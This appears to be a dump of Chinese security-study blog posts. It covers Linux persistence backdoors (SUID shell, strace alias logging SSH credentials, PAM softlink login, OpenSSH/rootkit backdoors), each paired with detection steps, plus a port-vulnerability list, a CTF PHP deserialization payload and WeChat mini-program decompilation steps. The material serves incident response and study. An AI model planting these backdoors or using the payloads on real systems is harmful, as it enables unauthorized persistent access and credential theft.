<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">除root账号外，其他账号是否存在sudo权限</span><br><span class="line">如非管理需要，普通账号应该删除sudo权限</span><br><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>

<h2 id="SUID-shell"><a href="#SUID-shell" class="headerlink" title="SUID shell"></a>SUID shell</h2><p>suid shell 是一种可用于以拥有者权限运行的shell<br>配合普通用户权限使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure>

<h2 id="suid-shell的排查技巧"><a href="#suid-shell的排查技巧" class="headerlink" title="suid shell的排查技巧"></a>suid shell的排查技巧</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在linux中查找suid设置的文件</span><br><span class="line">find . -perm /4000</span><br><span class="line">该命令的作用是查找当前目录及其子目录下所有设置了SUID权限位的文件，并将它们列出来。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>具体来说，”.”表示当前目录，”-perm /4000”表示要查找文件的权限掩码中包含4000的文件。4000代表SUID位，当某个文件设置了SUID权限位时，该文件将以拥有该文件的所有者的身份运行，而不是以执行该文件的用户的身份运行。这种权限通常用于特定的系统任务，如密码更改等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在linux中查找使用sgid设置的文件</span><br><span class="line">find . -perm /2000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">取消s权限</span><br><span class="line">chmod u-s /tmp/shell</span><br></pre></td></tr></table></figure>

<h2 id="ssh公私钥免密登陆"><a href="#ssh公私钥免密登陆" class="headerlink" title="ssh公私钥免密登陆"></a>ssh公私钥免密登陆</h2><p>在客户端上生成一堆公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登陆时，ssh程序会发送私钥去和服务器上的公钥最匹配，匹配成功就可以登陆了。</p>
<p>客户端公钥生成<br><code>ssh-keygen -t rsa</code><br>然后将公钥追加到<code>/root/.ssh/authorized_keys</code>内即可    </p>
<h2 id="ssh公私钥免密登陆排查技巧"><a href="#ssh公私钥免密登陆排查技巧" class="headerlink" title="ssh公私钥免密登陆排查技巧"></a>ssh公私钥免密登陆排查技巧</h2><p>查看<code>/root/.ssh/authorized_keys</code>是否被修改过</p>
<h2 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h2><p>实质上就是PAM认证是通过软连接的文件名/tmp/su在/etc/pam.d/目录下寻找对应的PAM配置文件（如/etc/pam.d/su），任意密码登陆的核心是auth sufficient pam_rootok.so,所以只要PAM配置文件中包含此配置即可ssh任意密码登陆，除了su中之外还有chsh、chfn同样可以</p>
<h2 id="软连接排查技巧"><a href="#软连接排查技巧" class="headerlink" title="软连接排查技巧"></a>软连接排查技巧</h2><p><img src="/2024/02/01/%E5%B8%B8%E8%A7%81linux%E7%BB%B4%E6%9D%83%E6%96%B9%E6%B3%95-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E5%90%8E%E9%97%A8%E5%A4%84%E7%BD%AE/image-20240201132243110.png" alt="image-20240201132243110"></p>
<h2 id="SSH-wrapper"><a href="#SSH-wrapper" class="headerlink" title="SSH wrapper"></a>SSH wrapper</h2><p>这个就理解为反弹shell就行。但这个是长连接的反弹shell，就是可以一直连接。</p>
<h2 id="ssh-wrapper排查技巧"><a href="#ssh-wrapper排查技巧" class="headerlink" title="ssh wrapper排查技巧"></a>ssh wrapper排查技巧</h2><p><code>ls -al /usr/sbin/sshd</code><br><code>cat /usr/sbin/sshd</code><br>可通过重装ssh服务来恢复</p>
<h2 id="strace后门"><a href="#strace后门" class="headerlink" title="strace后门"></a>strace后门</h2><p>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/bashrc</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;</span><br><span class="line">source /root/.bashrc</span><br></pre></td></tr></table></figure>

<h2 id="strace后门排查"><a href="#strace后门排查" class="headerlink" title="strace后门排查"></a>strace后门排查</h2><p>使用alias即可发现异常</p>
<p><img src="/2024/02/01/%E5%B8%B8%E8%A7%81linux%E7%BB%B4%E6%9D%83%E6%96%B9%E6%B3%95-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E5%90%8E%E9%97%A8%E5%A4%84%E7%BD%AE/image-20240201133643755.png" alt="image-20240201133643755"></p>
<h2 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h2><p>这个我就不说了吧，</p>
<h2 id="排查计划任务"><a href="#排查计划任务" class="headerlink" title="排查计划任务"></a>排查计划任务</h2><p>crontab -e</p>
<h2 id="openssh后门"><a href="#openssh后门" class="headerlink" title="openssh后门"></a>openssh后门</h2><p>利用openssh后门，设置ssh后门密码及root密码记录位置，隐蔽性强，不易被发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">备份ssh配置文件</span><br><span class="line">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span><br><span class="line"></span><br><span class="line">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/01/%E5%B8%B8%E8%A7%81linux%E7%BB%B4%E6%9D%83%E6%96%B9%E6%B3%95-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E5%90%8E%E9%97%A8%E5%A4%84%E7%BD%AE/image-20240201153909636.png" alt="image-20240201153909636"><br><img src="/2024/02/01/%E5%B8%B8%E8%A7%81linux%E7%BB%B4%E6%9D%83%E6%96%B9%E6%B3%95-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E5%90%8E%E9%97%A8%E5%A4%84%E7%BD%AE/image-20240201154000929.png" alt="image-20240201154000929"><br><img src="/2024/02/01/%E5%B8%B8%E8%A7%81linux%E7%BB%B4%E6%9D%83%E6%96%B9%E6%B3%95-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E5%90%8E%E9%97%A8%E5%A4%84%E7%BD%AE/image-20240201154020299.png" alt="image-20240201154020299"></p>
<h2 id="openssh排查技巧"><a href="#openssh排查技巧" class="headerlink" title="openssh排查技巧"></a>openssh排查技巧</h2><p>利用strace找出ssh后门</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取可疑ip</span><br><span class="line">ps aux | grep sshd</span><br><span class="line">跟踪sshd pid</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e null -e denied | grep WR	</span><br></pre></td></tr></table></figure>

<h2 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h2><p><a href="https://blog.csdn.net/weixin_40412037/article/details/118728788">LINUX留后门–教程（六）—— PAM后门_pam_unix.so-CSDN博客</a></p>
<p>先不实操了，主要是刷课，了解大纲</p>
<h2 id="rookit后门"><a href="#rookit后门" class="headerlink" title="rookit后门"></a>rookit后门</h2><p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口</p>
<p>安装完成后，直接 ssh用户@IP -P 端口</p>
<h2 id="排查技巧"><a href="#排查技巧" class="headerlink" title="排查技巧"></a>排查技巧</h2><p>查看端口是否异常，RPM chake查看命令是否被替换</p>
<p><img src="/2024/02/01/%E5%B8%B8%E8%A7%81linux%E7%BB%B4%E6%9D%83%E6%96%B9%E6%B3%95-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E5%90%8E%E9%97%A8%E5%A4%84%E7%BD%AE/image-20240201155135768.png" alt="image-20240201155135768"></p>
<p>这个也是一个大类的哈，我们后面会专门出</p>
<p>主流rootkit实现有下面三种方式：<br>库文件劫持<br>系统文件替换<br>LKM</p>
]]></content>
      <categories>
        <category>-yingji</category>
      </categories>
  </entry>
  <entry>
    <title>常见端口服务及可能存在的漏洞</title>
    <url>/2022/08/18/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%8A%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="常见端口服务及可能存在的漏洞"><a href="#常见端口服务及可能存在的漏洞" class="headerlink" title="常见端口服务及可能存在的漏洞"></a><a href="https://www.cnblogs.com/zcg-cpdd/p/14630766.html">常见端口服务及可能存在的漏洞</a></h1><p>（搬运一篇文章）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7： echo服务，通常作为测试服务使用，可能被用作拒绝服务攻击(TCP/UDP 7)</span><br><span class="line">17：quotd(qotd)服务，可能被发起&quot;ping pong&quot;攻击，利用源地址欺骗使tcp和udp两个端口运行qotd的服务器相互发送数据阻塞网络。(tcp/udp 17)</span><br><span class="line">19：chargen服务，通qotd服务</span><br><span class="line">20：FTP服务的数据传输端口</span><br><span class="line">21：FTP服务的连接端口，可能存在 弱口令暴力破解</span><br><span class="line">22：SSH服务端口，可能存在 弱口令暴力破解</span><br><span class="line">23：Telnet端口，可能存在 弱口令暴力破解</span><br><span class="line">25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应</span><br><span class="line">43：whois服务端口</span><br><span class="line">53：DNS服务端口(TCP/UDP 53)</span><br><span class="line">67/68：DHCP服务端口</span><br><span class="line">69：TFTP端口，可能存在弱口令</span><br><span class="line">80：HTTP端口，常见web漏洞</span><br><span class="line">88：Kerberos协议端口</span><br><span class="line">110：POP3邮件服务端口，和SMTP的25端口对应</span><br><span class="line">123：ntp服务(udp 123)</span><br><span class="line">135：RPC服务</span><br><span class="line">137/138： NMB服务</span><br><span class="line">139：SMB/CIFS服务，用于windows文件和打印机共享，可能爆破未授权访问 远程代码执行</span><br><span class="line">143：IMAP协议端口</span><br><span class="line">161/162: Snmp服务，public弱口令</span><br><span class="line">389：LDAP目录访问协议，有可能存在注入、弱口令，域控才会开放此端口</span><br><span class="line">443：HTTPS端口，心脏滴血等与SSL有关的漏洞</span><br><span class="line">445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010</span><br><span class="line">512/513/514：Linux Rexec服务端口，可能存在爆破。513一般是rlogin远程连接的端口。</span><br><span class="line">636：LDAPS目录访问协议，域控才会开放此端口</span><br><span class="line">873：Rsync ，可能存在Rsync未授权访问漏洞</span><br><span class="line">1080：socket端口，可能存在爆破</span><br><span class="line">1099：RMI，可能存在 RMI反序列化漏洞</span><br><span class="line">1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露</span><br><span class="line">1414：IBM WebSphere MQ服务端口</span><br><span class="line">1433：SQL Server对外提供服务端口</span><br><span class="line">1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口</span><br><span class="line">1521：oracle数据库端口</span><br><span class="line">2049：NFS服务端口，可能存在NFS配置不当</span><br><span class="line">2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞</span><br><span class="line">2375：Docker端口，可能存在 Docker未授权访问漏洞</span><br><span class="line">2601: Zebra ，默认密码zebr</span><br><span class="line">3128: squid ，匿名访问（可能内网漫游)</span><br><span class="line">3268：LDAP目录访问协议，有可能存在注入、弱口令</span><br><span class="line">3306：MySQL数据库端口，可能存在 弱口令暴力破解</span><br><span class="line">3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现</span><br><span class="line">3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞</span><br><span class="line">4000：腾讯QQ客户端开放此端口</span><br><span class="line">4440：Rundeck，弱口令admin</span><br><span class="line">4560：log4j SocketServer监听的端口，可能存在 log4j&lt;=1.2.17反序列化漏洞（CVE-2019-17571）</span><br><span class="line">4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)</span><br><span class="line">4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin</span><br><span class="line">5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞</span><br><span class="line">5432：PostGreSQL数据库的端口</span><br><span class="line">5632：PyAnywhere服务端口，可能存在代码执行漏洞</span><br><span class="line">5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞</span><br><span class="line">5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞</span><br><span class="line">6379：Redis数据库端口，可能存在Redis未授权访问漏洞</span><br><span class="line">7001/7002：Weblogic，可能存在Weblogic反序列化漏洞</span><br><span class="line">7180：Cloudera manager端口</span><br><span class="line">8000：JDWP，可能存在JDWP远程代码执行漏洞。</span><br><span class="line">8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞</span><br><span class="line">8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞</span><br><span class="line">8080-8090：可能存在web服务</span><br><span class="line">8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞</span><br><span class="line">8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）</span><br><span class="line">9000：fastcgi端口，可能存在远程命令执行漏洞</span><br><span class="line">9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)</span><br><span class="line">9043/9090：WebSphere，可能存在WebSphere反序列化漏洞</span><br><span class="line">9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞</span><br><span class="line">10000：Webmin-Web控制面板，可能存在弱口令</span><br><span class="line">10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞</span><br><span class="line">11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞</span><br><span class="line">27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞</span><br><span class="line">50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。</span><br><span class="line">50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞</span><br><span class="line">61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）</span><br><span class="line">60020：hbase.regionserver.port，HRegionServer的RPC端口</span><br><span class="line">60030：hbase.regionserver.info.port，HRegionServer的http端口</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>平时要注意url地址里面的东西</title>
    <url>/2021/12/27/%E5%B9%B3%E6%97%B6%E8%A6%81%E6%B3%A8%E6%84%8Furl%E5%9C%B0%E5%9D%80%E9%87%8C%E9%9D%A2%E7%9A%84%E4%B8%9C%E8%A5%BF/</url>
    <content><![CDATA[<p>有可能会有重要的参数<br>然后base64之类的</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>强网杯 随便注（sql堆叠注入以及select绕过）</title>
    <url>/2021/12/27/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8%EF%BC%88sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Aselect%E7%BB%95%E8%BF%87%EF%BC%89/</url>
    <content><![CDATA[<p>强网杯 随便注（sql堆叠注入以及select绕过）</p>
<p>[<a href="https://www.cnblogs.com/chalan630/p/12583667.html">强网杯 2019]随便注 - chalan630 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>序列化与发序列化 绕过__weakup()</title>
    <url>/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/</url>
    <content><![CDATA[<h1 id="序列化与发序列化"><a href="#序列化与发序列化" class="headerlink" title="序列化与发序列化"></a>序列化与发序列化</h1><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-1前置知识"><a href="#1-1前置知识" class="headerlink" title="1.1前置知识"></a>1.1前置知识</h2><p>反序列化的对象是类与对象</p>
<h3 id="1-1-1常用的一些魔术方法"><a href="#1-1-1常用的一些魔术方法" class="headerlink" title="1.1.1常用的一些魔术方法"></a>1.1.1常用的一些魔术方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br><span class="line">__construct()//创建对象的时候使用</span><br></pre></td></tr></table></figure>



<h3 id="1-1-2相关函数"><a href="#1-1-2相关函数" class="headerlink" title="1.1.2相关函数"></a>1.1.2相关函数</h3><p><code>unserialize()</code>将传入字符串反序列化。</p>
<p><code>serialize()</code>将传入变量序列化。</p>
<p>与之类似于还有:<code>json_encode</code>和<code>json_decode</code></p>
<h3 id="1-1-3序列化与反序列化"><a href="#1-1-3序列化与反序列化" class="headerlink" title="1.1.3序列化与反序列化"></a>1.1.3序列化与反序列化</h3><p>序列化是将任意类型的变量以特定的规则转换成一串字符串，可以用更少的空间保存对象里的信息，便于传输；反序列化则是根据规则还原字符串所对应的变量；</p>
<p>如果变量类型是<code>protected</code>，则会在变量名前加上<code>%00*%00</code>,<code>private</code>则会在变量名前加上<code>%00类名%00</code>（这里不可见字符要用url编码表示）</p>
<h3 id="1-1-4格式"><a href="#1-1-4格式" class="headerlink" title="1.1.4格式"></a>1.1.4格式</h3><p><img src="/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/image-20220119132735454.png" alt="image-20220119132735454"></p>
<p><img src="/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/image-20220119132752202.png" alt="image-20220119132752202"></p>
<h1 id="2-常见的绕过"><a href="#2-常见的绕过" class="headerlink" title="2.常见的绕过"></a>2.常见的绕过</h1><p>[(33条消息) <a href="https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&app_version=4.16.0">CTF]PHP反序列化总结_Y4tacker的博客-CSDN博客_php反序列化</a></p>
<h1 id="3-找点题"><a href="#3-找点题" class="headerlink" title="3.找点题"></a>3.找点题</h1><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>访问<a href="http://www.zip拿到源码/">www.zip拿到源码</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//class.php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">  <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">  <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line">   <span class="comment">//index.php</span></span><br></pre></td></tr></table></figure>

<p>index.php ，会调用class.php，以及对输入反序列化</p>
<p>然后因为要绕过wakeup,把Name后的数字改成3.因为username和password是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以要加上%00</p>
<p>最后payload:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>：&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>提交得到flag</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>微信小程序反编译_只有部分源码_挖坑</title>
    <url>/2022/10/17/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91_%E5%8F%AA%E6%9C%89%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81-%E6%8C%96%E5%9D%91/</url>
    <content><![CDATA[<h1 id="微信小程序反编译（只有部分源码-挖坑"><a href="#微信小程序反编译（只有部分源码-挖坑" class="headerlink" title="微信小程序反编译（只有部分源码_挖坑"></a>微信小程序反编译（只有部分源码_挖坑</h1><p>看到了两篇反编译的文章，觉得不错，故总结一下。</p>
<p>首先感谢Azeng师傅和虫虫师傅的文章</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>1、电脑版微信、2、手机微信、3、wuWxapkg.js解包、4、电脑版解密工具（针对PC版的）、5、node.js环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node.js：https://nodejs.org/zh-cn/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/17/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91_%E5%8F%AA%E6%9C%89%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81-%E6%8C%96%E5%9D%91/image-20221017185831681.png" alt="image-20221017185831681"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wuWxapkg.js ：https://github.com/qwerty472123/wxappUnpacker</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/17/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91_%E5%8F%AA%E6%9C%89%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81-%E6%8C%96%E5%9D%91/image-20221017185845669.png" alt="image-20221017185845669"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、使用wuWxapkg.js 需要安装依赖文件，按照下面一步步执行即可。</span><br><span class="line"></span><br><span class="line">npm config set registry https://registry.npm.taobao.org # 设置国内下载链接</span><br><span class="line">npm install esprima</span><br><span class="line">npm install css-tree</span><br><span class="line">npm install cssbeautify</span><br><span class="line">npm install vm2</span><br><span class="line">npm install uglify-es</span><br><span class="line">npm install js-beautify</span><br><span class="line">npm install escodegen</span><br><span class="line">npm install cheerio</span><br></pre></td></tr></table></figure>

<h1 id="pc"><a href="#pc" class="headerlink" title="pc"></a>pc</h1><p>PC端小程序源码包存放位置在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">微信文件保存位置\WeChatFiles\Applet\小程序id\\_\_APP\_\_.wxapkg</span><br></pre></td></tr></table></figure>

<p>然后拿到包后，用解密软件解密一下</p>
<p><img src="/2022/10/17/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91_%E5%8F%AA%E6%9C%89%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81-%E6%8C%96%E5%9D%91/image-20221017201930140.png" alt="image-20221017201930140"></p>
<p>解密之后反编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node wuWxapkg.js C:\Users\Red-Tools\Desktop\test\wxf5447d76338832b7.wxapkg</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/qq_34060370/article/details/124597739">(111条消息) 微信小程序反编译报SyntaxError: Unexpected token ‘}‘ 不完美的解决方法_刘建杰的博客-CSDN博客_反编译的小程序源码报错</a></p>
<h1 id="手机"><a href="#手机" class="headerlink" title="手机"></a>手机</h1><p>手机其实找wxapkg包比较麻烦，优点就是可以不用去解密。</p>
<p>手机端小程序源码包存放地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/data/data/com.tencent.mm/MicroMsg/32位的用户号/appbrand/pkg # 这里不是从根目录开始的，而是从文件目录开始</span><br></pre></td></tr></table></figure>

<p>2、获取到了wxapkg包，就可以直接拿wuWxapkg.js 来反编译了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node wuWxapkg.js C:\Users\Red-Tools\Desktop\test\wxf5447d76338832b7.wxapkg</span><br></pre></td></tr></table></figure>

<p>ios位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/mobile/Containers/Data/Application/&#123;程序 UUID&#125;/Library/WechatPrivate/&#123;用户ID&#125;/WeApp/LocalCache/release/&#123;⼩程序ID&#125;/ </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>-nixiang</category>
      </categories>
  </entry>
  <entry>
    <title>手机解决抓包网络未连接问题</title>
    <url>/2022/04/27/%E6%89%8B%E6%9C%BA%E8%A7%A3%E5%86%B3%E6%8A%93%E5%8C%85%E7%BD%91%E7%BB%9C%E6%9C%AA%E8%BF%9E%E6%8E%A5%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p><a href="https://www.imooc.com/article/251500">解决app应用在开启抓包工具后无法联网问题-图文教程_慕课手记 (imooc.com)</a></p>
<p><a href="https://blog.csdn.net/weixin_45674354/article/details/122970360">(70条消息) App 抓包提示网络异常怎么破？_芒果不是程序猿的博客-CSDN博客_app抓包无法连接网络</a></p>
<p>转载两篇博客，方便日后查阅</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>指纹识别-EHole</title>
    <url>/2023/02/12/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-EHole/</url>
